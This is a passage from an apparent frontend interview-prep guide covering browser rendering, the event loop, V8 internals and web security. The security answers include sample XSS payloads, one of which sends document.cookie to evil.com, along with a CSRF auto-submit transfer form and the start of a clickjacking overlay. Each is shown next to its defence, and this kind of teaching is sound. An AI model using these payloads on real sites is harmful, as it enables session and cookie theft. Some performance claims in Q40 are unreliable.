**Key Reason:** Operate on **composited layers** handled by GPU, bypassing layout and paint.

**Rendering Pipeline Comparison:**

```
// Position change (top/left)
Layout → Paint → Composite  [Slow - all 3 stages]

// Transform change
Composite only             [Fast - GPU only]
```

**GPU Acceleration:**
- Transforms create new layer
- Layer compositing happens on GPU
- No main thread blocking
- Smooth 60fps animations possible

**Will-Change Optimization:**
```css
.animated {
  will-change: transform, opacity;
  /* Promotes element to its own layer */
}
```

**Example:**
```css
/* ❌ SLOW - triggers layout + paint */
@keyframes slideIn {
  from { left: -100px; }
  to { left: 0; }
}

/* ✅ FAST - composite-only */
@keyframes slideIn {
  from { transform: translateX(-100px); }
  to { transform: translateX(0); }
}
```

---

### Q20: How does the browser build layers?

**Layer Promotion Criteria:**

1. **Explicit Composition:**
   - `will-change: transform, opacity`
   - 3D transforms (`translateZ`, `perspective`)
   - `<video>`, `<canvas>`, `<iframe>`
   - Filters, masks, blend modes

2. **Implicit Composition:**
   - `position: fixed` or `position: sticky`
   - Overflow scroll (`overflow: auto/scroll`)
   - CSS animations/transitions on transform/opacity
   - Elements above composited layers

**Layer Architecture:**
```
Main Thread:
  Layout → Paint → Generate display lists
      ↓
Compositor Thread (GPU):
  Combine layers → Output to screen
```

**Trade-offs:**
- **Benefit:** Smooth animations, reduced repaints
- **Cost:** Memory overhead, texture uploads

**Anti-pattern:**
```css
/* ❌ Creates TOO MANY layers */
* {
  will-change: transform;  /* Don't do this! */
}
```

---

### Q21: Why is large DOM bad for performance?

**Performance Impacts:**

1. **Layout Cost** - O(n) complexity for recalculations
   - More nodes = longer layout time
   - Nested structures compound the cost

2. **Memory Usage**
   - Each DOM node: ~1KB memory
   - 10,000 nodes ≈ 10MB just for DOM

3. **Rendering Cost**
   - More paint operations
   - Larger render trees
   - More layers to composite

4. **JavaScript Performance**
   - Slow querySelector/querySelectorAll
   - Event delegation traversal cost
   - Mutation observer overhead

**Benchmarks:**
```
1,000 nodes   → 16ms layout (< 1 frame)
10,000 nodes  → 150ms layout (9 dropped frames)
50,000 nodes  → 750ms layout (45 dropped frames)
```

**Solutions:**
- Virtual scrolling (render only visible items)
- Pagination
- Progressive rendering
- CSS containment

---

### Q22: Explain event delegation.

**Definition:** Attach single event listener to parent instead of multiple listeners on children.

**How it works:**
```javascript
// ❌ BAD - 1000 event listeners
document.querySelectorAll('.item').forEach(item => {
  item.addEventListener('click', handleClick);
});

// ✅ GOOD - 1 event listener
document.querySelector('.list').addEventListener('click', (e) => {
  if (e.target.matches('.item')) {
    handleClick(e);
  }
});
```

**Benefits:**
1. **Fewer listeners** - Better memory usage
2. **Dynamic elements** - Works for elements added later
3. **Simpler cleanup** - No need to remove individual listeners

**Event Bubbling:**
```
Click on <button>
    ↓
<button> handler (target phase)
    ↓
<div> handler (bubbling phase)
    ↓
<body> handler
    ↓
<html> handler
```

**When NOT to use:**
- Events that don't bubble (focus, blur, load)
- When you need exact target without matching

---

### Q23: How does browser scheduling work?

**Event Loop Phases:**

```
1. Execute Macrotask (one task)
     ↓
2. Execute ALL Microtasks
     ↓
3. Render if needed (requestAnimationFrame → Layout → Paint)
     ↓
4. requestIdleCallback (if time remaining)
     ↓
Repeat
```

**Task Queues:**

**Macrotask Queue:**
- setTimeout, setInterval
- setImmediate (Node.js)
- I/O operations
- UI rendering
- postMessage

**Microtask Queue:**
- Promise.then/catch/finally
- queueMicrotask()
- MutationObserver
- process.nextTick (Node.js)

**Example Execution Order:**
```javascript
console.log('1. Sync');

setTimeout(() => console.log('2. Macro'), 0);

Promise.resolve().then(() => console.log('3. Micro'));

console.log('4. Sync');

// Output: 1 → 4 → 3 → 2
```

---

### Q24: Difference between requestAnimationFrame and requestIdleCallback?

| Feature | requestAnimationFrame | requestIdleCallback |
|---------|----------------------|---------------------|
| **Timing** | Before next paint | During idle time |
| **Frequency** | ~60fps (16.67ms) | Variable, opportunistic |
| **Priority** | High | Low |
| **Use Case** | Animations, visual updates | Non-critical work |
| **Guarantee** | Runs every frame | May not run if busy |

**requestAnimationFrame:**
```javascript
function animate() {
  // Smooth 60fps animation
  element.style.transform = `translateX(${x}px)`;
  x += 1;
  requestAnimationFrame(animate);
}
```

**requestIdleCallback:**
```javascript
requestIdleCallback((deadline) => {
  // Work while idle
  while (deadline.timeRemaining() > 0 && tasks.length) {
    processTask(tasks.shift());
  }
}, { timeout: 1000 });  // Force execution after 1s
```

---

### Q25: Why is long JavaScript execution harmful?

**Single-Threaded Main Thread:**

```
Main Thread:
  JS Execution (250ms) → [User clicks button... no response]
                       → [Frame deadline missed × 15]
  Finally finishes → Process queued events
```

**Problems:**

1. **Blocks Rendering** - No frames painted during execution
2. **Input Lag** - User interactions queued but not processed
3. **Jank** - Dropped frames cause stuttering
4. **Poor UX** - App feels frozen

**Long Task:** Any task > 50ms

**Solutions:**

1. **Break up work:**
```javascript
// ❌ Blocks for 500ms
for (let i = 0; i < 1000000; i++) {
  processItem(i);
}

// ✅ Yield to browser
async function processChunked() {
  for (let i = 0; i < 1000000; i += 1000) {
    for (let j = 0; j < 1000; j++) {
      processItem(i + j);
    }
    await new Promise(resolve => setTimeout(resolve, 0));  // Yield
  }
}
```

2. **Use Web Workers** for heavy computation
3. **Debounce/throttle** expensive operations

---

### Q26: How do Web Workers improve performance?

**Web Workers** = Separate thread for JavaScript execution.

**Benefits:**

1. **Offload CPU-heavy tasks**
   - Parsing large JSON
   - Image processing
   - Encryption/hashing
   - Data analysis

2. **Non-blocking**
   - Main thread stays responsive
   - Smooth UI during computation

3. **Parallel processing**
   - Utilize multi-core CPUs

**Example:**
```javascript
// main.js
const worker = new Worker('worker.js');

worker.postMessage({ data: largeDataset });

worker.onmessage = (e) => {
  console.log('Result:', e.data);
};

// worker.js
self.onmessage = (e) => {
  const result = expensiveOperation(e.data);
  self.postMessage(result);
};
```

**Limitations:**
- No DOM access
- No window object
- Communication via postMessage (structured clone)
- Overhead for small tasks

---

### Q27: What is a compositing-only change?

**Definition:** Style change that requires ONLY GPU compositing, skipping layout and paint.

**Eligible Properties:**
- `transform` (translate, scale, rotate)
- `opacity`
- `filter` (on composited layer)

**Rendering Pipeline Comparison:**

```
Full Pipeline:
JavaScript → Style → Layout → Paint → Composite
                                         ↓
                                     [GPU renders]

Composite-Only:
JavaScript → Style → Composite
                         ↓
                     [GPU renders]
```

**Why it's fast:**
- CPU layout/paint skipped
- GPU handles transformation
- Independent of main thread
- Consistent 60fps achievable

**Requirements:**
```css
.element {
  /* Promote to layer first */
  will-change: transform;
  
  /* Then animate */
  transform: translateX(100px);  /* Composite-only */
}
```

**Verification in DevTools:**
- Use "Rendering" tab → "Layer borders"
- Green border = composited layer

---

### Q28: How does lazy loading images work?

**Native Lazy Loading:**
```html
<img src="image.jpg" loading="lazy" alt="Description">
```

**Browser Behavior:**
- Loads image when it enters viewport (+ margin)
- Default margin: ~3000px
- No JavaScript required

**Intersection Observer (Custom):**
```javascript
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const img = entry.target;
      img.src = img.dataset.src;  // Load actual image
      observer.unobserve(img);
    }
  });
}, {
  rootMargin: '50px'  // Load 50px before entering viewport
});

document.querySelectorAll('img[data-src]').forEach(img => {
  observer.observe(img);
});
```

**Benefits:**
- Reduces initial page weight
- Faster initial load
- Saves bandwidth
- Improves Core Web Vitals (LCP)

---

### Q29: What are Web Vitals?

**Core Web Vitals** = User-centric performance metrics.

**1. LCP (Largest Contentful Paint)**
- **Measures:** Loading performance
- **Target:** < 2.5 seconds
- **What counts:** Largest visible element (image, video, text block)
- **Optimize:** Reduce server response time, optimize images, eliminate render-blocking

**2. INP (Interaction to Next Paint)**
- **Measures:** Responsiveness
- **Target:** < 200ms
- **Replaces:** FID (First Input Delay)
- **What counts:** Latency of ALL user interactions
- **Optimize:** Break up long tasks, reduce JavaScript, use web workers

**3. CLS (Cumulative Layout Shift)**
- **Measures:** Visual stability
- **Target:** < 0.1
- **What counts:** Unexpected layout shifts during page lifetime
- **Optimize:** Size attributes on images/videos, avoid dynamic content insertion, reserve space for ads

**Calculation Example (CLS):**
```
Frame 1: Element shifts 25% of viewport = 0.25 impact
Frame 2: Element shifts 10% of viewport = 0.10 impact
CLS Score = 0.25 + 0.10 = 0.35 (Poor)
```

---

### Q30: What causes layout shifts (CLS)?

**Common Causes:**

1. **Images without dimensions**
```html
<!-- ❌ BAD - causes shift when loaded -->
<img src="photo.jpg" alt="Photo">

<!-- ✅ GOOD - reserves space -->
<img src="photo.jpg" width="800" height="600" alt="Photo">
```

2. **Web fonts (FOIT/FOUT)**
```css
/* ❌ Causes shift when font loads */
body { font-family: 'CustomFont'; }

/* ✅ Use font-display */
@font-face {
  font-family: 'CustomFont';
  font-display: swap;  /* Show fallback immediately */
}
```

3. **Dynamic content injection**
```javascript
// ❌ Pushes content down
document.body.insertAdjacentHTML('afterbegin', bannerHTML);

// ✅ Reserve space with min-height
element.style.minHeight = '100px';
```

4. **Ads without reserved space**
5. **Animations that change height/width**
6. **Late-loading stylesheets**

**Prevention:**
- Always specify dimensions on media
- Use `aspect-ratio` CSS property
- Reserve space for dynamic content
- Use `font-display: swap` or `font-display: optional`

---

## 3. JavaScript Engine Internals (10 Questions)

### Q31: How does V8 compile JavaScript?

**V8 Compilation Pipeline:**

```
1. Parser
   ↓
   Abstract Syntax Tree (AST)
   ↓
2. Ignition (Interpreter)
   ↓
   Bytecode (executed immediately)
   ↓
3. TurboFan (Optimizing Compiler)
   ↓
   Optimized Machine Code
   ↓
4. Deoptimization (if assumptions break)
   ↓
   Back to bytecode
```

**Stages in Detail:**

1. **Eager Parsing:** Top-level code parsed immediately
2. **Lazy Parsing:** Functions parsed only when called
3. **Hot Code Detection:** Ignition monitors execution frequency
4. **Speculative Optimization:** TurboFan makes assumptions (types, shapes)
5. **Deoptimization:** Falls back if assumptions violated

**Example:**
```javascript
function add(a, b) {
  return a + b;
}

// First 100 calls: a and b are numbers
// V8 optimizes for number addition

add(1, 2);  // Optimized machine code path

add("hello", "world");  // DEOPTIMIZATION! String addition
```

---

### Q32: What are hidden classes?

**Hidden Classes (Maps)** = Internal structures V8 uses to optimize property access.

**Problem:** JavaScript objects are dynamic dictionaries (slow lookups).

**Solution:** V8 creates hidden classes that track object structure.

**Example:**
```javascript
function Point(x, y) {
  this.x = x;  // Hidden class C0 → C1 (added 'x')
  this.y = y;  // Hidden class C1 → C2 (added 'y')
}

const p1 = new Point(1, 2);
const p2 = new Point(3, 4);
// p1 and p2 share hidden class C2 → Fast property access
```

**Breaking Hidden Classes:**
```javascript
const p3 = new Point(5, 6);
delete p3.x;  // ❌ Different hidden class, can't be optimized

const p4 = new Point(7, 8);
p4.z = 9;    // ❌ Different property order → Different hidden class
```

**Best Practices:**
- Initialize all properties in constructor
- Add properties in same order
- Avoid `delete` operator
- Keep object shapes consistent

---

### Q33: What is inline caching?

**Inline Caching (IC)** = V8 optimization that remembers property access locations.

**How it works:**
```javascript
function getName(obj) {
  return obj.name;  // First call: lookup 'name' property
}

getName({ name: 'Alice' });  // Cache: "name is at offset 0"
getName({ name: 'Bob' });    // Fast path: direct memory access
```

**Cache States:**

1. **Uninitialized** - Never called
2. **Monomorphic** - One object shape (fastest)
   ```javascript
   getName(user1);  // Shape A
   getName(user2);  // Shape A → Monomorphic IC
   ```

3. **Polymorphic** - 2-4 object shapes (slower)
   ```javascript
   getName(user);     // Shape A
   getName(admin);    // Shape B → Polymorphic IC
   ```

4. **Megamorphic** - 5+ shapes (slowest)
   ```javascript
   getName(obj1);  // Shape A
   getName(obj2);  // Shape B
   getName(obj3);  // Shape C
   getName(obj4);  // Shape D
   getName(obj5);  // Shape E → Megamorphic (dictionary lookup)
   ```

**Performance Impact:**
- Monomorphic: ~1x (baseline)
- Polymorphic: ~3x slower
- Megamorphic: ~10x slower

---

### Q34: Why is `delete obj.key` slow?

**Reasons:**

1. **Changes Hidden Class**
   ```javascript
   const obj = { a: 1, b: 2, c: 3 };  // Hidden class C1
   delete obj.b;                       // New hidden class C2
   // C1 and C2 are different → No IC optimization
   ```

2. **Breaks Inline Caching** - Property offsets change
3. **Forces Dictionary Mode** - Object becomes slow hash table
4. **Triggers Deoptimization** - Any optimized code using this shape

**Better Alternative:**
```javascript
// ❌ SLOW
delete obj.key;

// ✅ FAST
obj.key = undefined;  // Keeps same hidden class
obj.key = null;       // Keeps same hidden class
```

**When delete is necessary:**
```javascript
// Use null/undefined doesn't work for iteration
for (let key in obj) {
  // undefined values still appear
}

// Must use delete if you need to truly remove
delete obj.key;
```

---

### Q35: Explain call stack and memory heap.

**Call Stack:**
- **Stores:** Function execution contexts, local variables, return addresses
- **Structure:** LIFO (Last In, First Out)
- **Size:** Limited (typically ~1MB)
- **Overflow:** Stack overflow error if too deep recursion

```javascript
function first() {
  console.log('First');
  second();
}

function second() {
  console.log('Second');
  third();
}

function third() {
  console.log('Third');
}

first();

// Call Stack:
// [global]
// [global] → [first]
// [global] → [first] → [second]
// [global] → [first] → [second] → [third]
// [global] → [first] → [second]
// [global] → [first]
// [global]
```

**Memory Heap:**
- **Stores:** Objects, closures, dynamic allocations
- **Structure:** Unordered memory region
- **Size:** Larger (GB range)
- **Management:** Garbage collection

**Memory Layout:**
```
Stack (grows down):        Heap (grows up):
┌─────────────────┐       ┌─────────────────┐
│ function frames │       │ {name: 'Alice'} │
│ local variables │       │ [1, 2, 3, 4, 5] │
│ primitives      │       │ function() {...}│
└─────────────────┘       │ closures        │
                          └─────────────────┘
```

---

### Q36: How does garbage collection work in V8?

**Generational GC Strategy:**

**1. Young Generation (Small, Frequent)**
- **Size:** ~1-8MB
- **Algorithm:** Scavenger (Cheney's algorithm)
- **Frequency:** Very frequent (milliseconds)
- **Assumption:** Most objects die young

**Process:**
```
Semi-space structure:
┌──────────┬──────────┐
│  From    │    To    │
│ (active) │ (empty)  │
└──────────┴──────────┘

1. Allocate in "From" space
2. When full, copy live objects to "To"
3. Swap "From" and "To"
4. Dead objects = freed
```

**2. Old Generation (Large, Infrequent)**
- **Size:** ~100MB - 1GB+
- **Algorithm:** Mark-Sweep-Compact
- **Frequency:** When old space fills up
- **Objects:** Survived 2+ young GC cycles

**Mark-Sweep-Compact:**
```
1. Mark Phase: Traverse from roots, mark reachable objects
2. Sweep Phase: Free unmarked objects
3. Compact Phase: Move objects to eliminate fragmentation
```

**Optimizations:**
- **Incremental Marking:** Spread marking over multiple frames
- **Lazy Sweeping:** Sweep on-demand
- **Concurrent Marking:** Mark on background thread
- **Parallel Compaction:** Use multiple threads

**When GC Runs:**
- Young GC: ~every few milliseconds
- Old GC: ~every few seconds
- Triggered by allocation failure

---

### Q37: Difference between microtasks and macrotasks?

**Task Queue Hierarchy:**

```
Event Loop:
1. Execute one Macrotask
2. Execute ALL Microtasks
3. Render (if needed)
4. Repeat
```

**Macrotasks (Task Queue):**
- `setTimeout` / `setInterval`
- `setImmediate` (Node.js)
- I/O operations
- UI rendering events
- `MessageChannel.postMessage`

**Microtasks (Job Queue):**
- `Promise.then/catch/finally`
- `queueMicrotask()`
- `MutationObserver`
- `process.nextTick` (Node.js - even higher priority)

**Execution Example:**
```javascript
console.log('1: Sync');

setTimeout(() => console.log('2: Macro 1'), 0);

Promise.resolve().then(() => {
  console.log('3: Micro 1');
  setTimeout(() => console.log('4: Macro 2'), 0);
});

Promise.resolve().then(() => console.log('5: Micro 2'));

setTimeout(() => console.log('6: Macro 3'), 0);

console.log('7: Sync');

// Output: 1 → 7 → 3 → 5 → 2 → 6 → 4
```

**Why Microtasks Run First:**
- Higher priority than macrotasks
- All microtasks cleared before next macrotask
- Ensures promise resolution before rendering

---

### Q38: Why is async/await just syntactic sugar?

**Under the Hood:** async/await compiles to promise chains and state machines.

**Example:**
```javascript
// This code:
async function fetchData() {
  const result = await fetch('/api');
  const data = await result.json();
  return data;
}

// Becomes (simplified):
function fetchData() {
  return fetch('/api').then(result => {
    return result.json();
  }).then(data => {
    return data;
  });
}
```

**State Machine Transformation:**
```javascript
async function example() {
  console.log('A');
  await Promise.resolve();
  console.log('B');
  await Promise.resolve();
  console.log('C');
}

// Transforms to state machine:
// State 0: Execute until first await
// State 1: Execute until second await
// State 2: Execute until return
```

**Key Points:**
- `async` function always returns a Promise
- `await` pauses execution, schedules as microtask
- Error handling with try/catch = `.catch()`
- Still uses microtask queue under the hood

**No Performance Difference:**
```javascript
// Same performance
await promise;
promise.then(value => ...);
```

---

### Q39: How does debouncing differ from throttling?

**Debouncing:** Execute AFTER rapid events stop

```javascript
// Debounce: Wait for typing to stop
function debounce(fn, delay) {
  let timeoutId;
  return function(...args) {
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => fn.apply(this, args), delay);
  };
}

const searchInput = debounce((query) => {
  fetch(`/search?q=${query}`);
}, 300);

// User types: h-e-l-l-o
// Only fires API call 300ms after "o"
```

**Throttling:** Execute AT MOST once per time period

```javascript
// Throttle: Limit execution rate
function throttle(fn, limit) {
  let inThrottle;
  return function(...args) {
    if (!inThrottle) {
      fn.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

const onScroll = throttle(() => {
  console.log('Scroll position:', window.scrollY);
}, 100);

// Fires at most every 100ms while scrolling
```

**Comparison:**

| Feature | Debounce | Throttle |
|---------|----------|----------|
| **When fires** | After silence period | At regular intervals |
| **Use case** | Search input, resize | Scroll, mousemove |
| **Events during** | Ignored | Some executed |
| **Last event** | Always fires | May be dropped |

**Visual Timeline:**
```
Events:  ↓ ↓ ↓ ↓ ↓     ↓ ↓     ↓ ↓ ↓
         [Rapid]       [Gap]   [Rapid]

Debounce:              ↓       ↓        ↓
         (waits for silence)

Throttle: ↓     ↓      ↓       ↓     ↓
         (fires at intervals)
```

---

### Q40: Why is JSON.parse fast?

**Reasons:**

1. **Native Implementation** - Written in optimized C++, not JavaScript
2. **Specialized Parser** - Purpose-built for JSON syntax only
3. **No Security Checks** - Unlike `eval()`, doesn't execute code
4. **Streaming Capable** - Can parse incrementally
5. **No Validation Overhead** - Assumes valid JSON (throws on invalid)

**Performance Comparison:**
```javascript
// ❌ SLOW (1000ms for 10MB)
const obj = eval('(' + jsonString + ')');  // Security risk!

// ✅ FAST (100ms for 10MB)
const obj = JSON.parse(jsonString);

// 🚀 FASTER (50ms for 10MB with large objects)
// V8 optimization for object literals
const obj = new Function('return ' + jsonString)();  // Still risky
```

**V8 Optimization:**
- Fast path for common patterns
- Avoids creating intermediate strings
- Direct memory allocation for result

**When JSON.parse is slow:**
```javascript
// Large nested structures
const deepObject = JSON.parse(veryLargeJSON);  // May cause GC pressure

// Better: Stream parse or chunk processing
```

---

## 4. Security Internals (10 Questions)

### Q41: What is XSS?

**XSS (Cross-Site Scripting)** = Injecting malicious scripts into trusted websites.

**Types:**

**1. Reflected XSS (Non-persistent)**
```javascript
// URL: https://site.com/search?q=<script>alert(document.cookie)</script>
// Server reflects input directly:
<div>Results for: <script>alert(document.cookie)</script></div>
```

**2. Stored XSS (Persistent)**
```javascript
// Attacker posts comment:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// Stored in database, executed for every viewer
```

**3. DOM-based XSS**
```javascript
// Vulnerable code:
const username = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + username;

// Attack: https://site.com#<img src=x onerror="alert('XSS')">
```

**Prevention:**

1. **Escape Output**
```javascript
// ✅ Escape HTML
function escapeHTML(str) {
  return str.replace(/[&<>"']/g, (char) => ({
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;'
  })[char]);
}
```

2. **Content Security Policy**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'
```

3. **Use textContent instead of innerHTML**
```javascript
// ❌ Vulnerable
element.innerHTML = userInput;

// ✅ Safe
element.textContent = userInput;
```

4. **Sanitize with DOMPurify**
5. **HttpOnly cookies** (prevent script access)
6. **Trusted Types API**

---

### Q42: What is CSRF?

**CSRF (Cross-Site Request Forgery)** = Attacker tricks authenticated user's browser into making unwanted requests.

**Attack Example:**
```html
<!-- Attacker's site -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- Or hidden form -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**Why it works:**
- Browser automatically sends cookies with request
- Bank sees authenticated session
- Request appears legitimate

**Prevention:**

**1. CSRF Tokens (Synchronizer Token)**
```html
<!-- Server generates unique token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random_token_123">
  <input name="amount" value="100">
  <button>Transfer</button>
</form>

<!-- Server validates token on submission -->
```

**2. SameSite Cookies**
```http
Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure
```

**3. Custom Headers**
```javascript
// AJAX requests can use custom headers
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': token,  // Attacker can't set this cross-origin
    'Content-Type': 'application/json'
  }
});
```

**4. Origin/Referer Validation**
```javascript
// Server checks
if (request.headers.origin !== 'https://trusted-site.com') {
  throw new Error('Invalid origin');
}
```

**5. Double Submit Cookie**
```javascript
// Token in both cookie and request body
document.cookie = 'csrf_token=abc123';
fetch('/api', {
  body: JSON.stringify({ csrf_token: 'abc123' })
});
```

---

### Q43: What is Same-Origin Policy?

**Same-Origin Policy (SOP)** = Browser security that isolates content from different origins.

**Origin Definition:**
```
Origin = Protocol + Domain + Port

https://example.com:443/page
└─┬─┘   └────┬────┘ └┬┘
Protocol  Domain    Port
```

**Same-Origin Examples:**
```
Origin: https://example.com

✅ Same Origin:
https://example.com/page
https://example.com:443/different

❌ Different Origin:
http://example.com        (different protocol)
https://api.example.com   (different subdomain)
https://example.com:8080  (different port)
https://example.org       (different domain)
```

**What SOP Restricts:**

1. **DOM Access**
```javascript
// ❌ Blocked: Different origin iframe
iframe.contentDocument.body.innerHTML;
```

2. **Cookies**
```javascript
// ❌ Can't read cookies from different origin
document.cookie; // Only same-origin
```

3. **XMLHttpRequest/Fetch**
```javascript
// ❌ Blocked without CORS
fetch('https://api.different-domain.com/data');
```

4. **LocalStorage/SessionStorage**
```javascript
// Each origin has isolated storage
localStorage.getItem('key'); // Origin-specific
```

**Why SOP Exists:**
- Prevents malicious site from reading sensitive data
- Isolates trust boundaries
- Protects user privacy and security

**Exceptions:**
- CORS (opt-in relaxation)
- postMessage (controlled cross-origin communication)
- JSONP (legacy, insecure)

---

### Q44: Why does CORS exist?

**CORS (Cross-Origin Resource Sharing)** = Controlled relaxation of Same-Origin Policy.

**The Problem:**
```javascript
// Before CORS, all cross-origin requests blocked
fetch('https://api.example.com/data'); // ❌ Blocked by SOP
```

**The Solution:**
Server explicitly allows cross-origin access via headers.

**CORS Headers:**
```http
# Server response
Access-Control-Allow-Origin: https://trusted-site.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
```

**Why CORS, not just disable SOP?**

1. **Opt-in Security** - Server chooses to share resources
2. **Prevents Data Theft** - Attacker can't arbitrarily read APIs
3. **Backward Compatible** - Doesn't break existing security
4. **Granular Control** - Specify exactly what's allowed

**Without CORS:**
```javascript
// Malicious site could do:
fetch('https://yourbank.com/account')
  .then(res => res.json())
  .then(data => sendToAttacker(data)); // ❌ Blocked!
```

**With CORS (when appropriate):**
```javascript
// Public API explicitly allows access
fetch('https://public-api.com/weather')
  .then(res => res.json()); // ✅ Allowed by server
```

---

### Q45: How do HTTPS and HSTS protect users?

**HTTPS (HTTP Secure):**

**Protection:**
1. **Encryption** - Data encrypted in transit (TLS/SSL)
2. **Authentication** - Certificate proves server identity
3. **Integrity** - Detects tampering via cryptographic hashes

**TLS Handshake:**
```
Client → ServerHello (certificate)
Client validates certificate chain
Client ← Server agree on cipher suite
Encrypted communication begins
```

**HSTS (HTTP Strict Transport Security):**

**Header:**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Protection:**

1. **Forces HTTPS**
```
User types: http://example.com
Browser automatically upgrades to: https://example.com
```

2. **Prevents Downgrade Attacks**
```
Attacker tries: Strip HTTPS → serve HTTP
Browser rejects: "HSTS policy requires HTTPS"
```

3. **Preload List**
- Hardcoded in browsers (Chrome, Firefox, Safari)
- HTTPS enforced even on first visit
- Submit at: hstspreload.org

**Attack Prevented:**
```
❌ Without HSTS:
User → http://bank.com → [Attacker MITM] → http://fake-bank.com

✅ With HSTS:
User → http://bank.com → [Browser] → https://bank.com (forced)
```

**Best Practice:**
```http
# After HTTPS is working, enable HSTS
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

---

### Q46: What is a preflight request?

**Preflight** = Browser sends OPTIONS request before actual request to verify CORS permissions.

**When Preflight Happens:**

**Simple Requests (No Preflight):**
- Methods: GET, HEAD, POST
- Headers: Accept, Accept-Language, Content-Language
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain

**Complex Requests (Requires Preflight):**
- Methods: PUT, DELETE, PATCH
- Custom headers: Authorization, X-Custom-Header
- Content-Type: application/json, application/xml

**Preflight Flow:**

```http
# 1. Browser sends OPTIONS
OPTIONS /api/data HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, Content-Type

# 2. Server responds
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 86400

# 3. Browser sends actual request
DELETE /api/data HTTP/1.1
Host: api.example.com
Authorization: Bearer token123
```

**Caching:**
```http
Access-Control-Max-Age: 86400  # Cache preflight for 24 hours
```

**Performance Impact:**
- Adds 1 RTT for complex requests
- Mitigate with preflight caching
- Consider simple requests where possible

---

### Q47: Why are HttpOnly cookies secure?

**HttpOnly Flag** = Cookie cannot be accessed by JavaScript.

**Security Benefit:**
```javascript
// ❌ Without HttpOnly
document.cookie; // "session=abc123; user=admin"
// XSS attacker can steal: fetch('https://evil.com?c=' + document.cookie)

// ✅ With HttpOnly
document.cookie; // "user=admin" (session cookie hidden)
// XSS attacker can't access session token
```

**Setting HttpOnly:**
```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

**What HttpOnly Prevents:**
- XSS cookie theft
- Session hijacking via JavaScript
- Client-side cookie manipulation

**What HttpOnly Doesn't Prevent:**
- CSRF (need SameSite or tokens)
- Network sniffing (need Secure flag)
- Server-side vulnerabilities

**Best Practice:**
```http
# Authentication cookies should always be:
Set-Cookie: session=token; 
  HttpOnly;           # No JS access
  Secure;            # HTTPS only
  SameSite=Strict;   # No cross-site
  Max-Age=3600;      # Expire after 1 hour
  Path=/;            # Available site-wide
```

---

### Q48: Explain Content Security Policy.

**CSP** = HTTP header that specifies trusted sources for content.

**Header Syntax:**
```http
Content-Security-Policy: directive1 source1 source2; directive2 source3
```

**Common Directives:**

**1. script-src** (most important)
```http
# Only allow scripts from same origin
Content-Security-Policy: script-src 'self'

# Allow specific domains
Content-Security-Policy: script-src 'self' https://cdn.example.com

# Allow inline scripts with nonce
Content-Security-Policy: script-src 'self' 'nonce-random123'
<script nonce="random123">alert('allowed')</script>

# Allow specific hash
Content-Security-Policy: script-src 'self' 'sha256-hash...'
```

**2. default-src** (fallback for all)
```http
Content-Security-Policy: default-src 'self'
```

**3. Other Directives**
```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' https://fonts.googleapis.com;
  img-src 'self' data: https:;
  font-src 'self' https://fonts.gstatic.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'
```

**XSS Mitigation:**
```javascript
// ❌ Without CSP: Injected script executes
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>

// ✅ With CSP: Blocked
Content-Security-Policy: script-src 'self'
// Console error: "Refused to execute inline script"
```

**Report-Only Mode (Testing):**
```http
Content-Security-Policy-Report-Only: default-src 'self'
```

**Upgrade Insecure Requests:**
```http
Content-Security-Policy: upgrade-insecure-requests
```

---

### Q49: How does OAuth prevent password sharing?

**OAuth** = Authorization framework that eliminates password sharing.

**Traditional Flow (Insecure):**
```
User → Types password into Third-Party App
App → Stores password
App → Logs in as user (full access forever)
```

**OAuth Flow (Secure):**
```
1. User clicks "Login with Google"
2. Redirected to Google (identity provider)
3. User authenticates with Google directly
4. Google asks: "Allow ThirdPartyApp to access your email?"
5. User approves
6. Google returns authorization code to ThirdPartyApp
7. ThirdPartyApp exchanges code for access token
8. ThirdPartyApp uses token to access user data
```

**Benefits:**

1. **No Password Sharing**
   - App never sees user's password
   - Password stays with identity provider

2. **Limited Scope**
```javascript
// App requests only what it needs
scope: "read:email read:profile"
// Not full account access
```

3. **Revocable**
```
User can revoke access anytime
Token expires automatically
```

4. **Auditable**
```
Identity provider logs all access
User can see which apps have access
```

**OAuth 2.0 Grant Types:**

**1. Authorization Code (most secure)**
```
Best for: Server-side apps
Flow: code → exchange for token
```

**2. Implicit (deprecated)**
```
Token in URL fragment (insecure)
```

**3. Client Credentials**
```
Best for: Machine-to-machine
No user involved
```

**4. PKCE (Proof Key for Code Exchange)**
```
Best for: Mobile/SPA apps
Prevents authorization code interception
```

---

### Q50: What is clickjacking? How to prevent it?

**Clickjacking** = Attacker overlays invisible iframe to trick users into clicking hidden elements.

**Attack Example:**
```html
<!-- Attacker's malicious page -->
<style>
  iframe {
    position: absolute;
    width: 500px;
    height: 500px;
    opacity: 0;  /* Invisible */
    z-index: 2;
  }
  button {
    position: absolute;
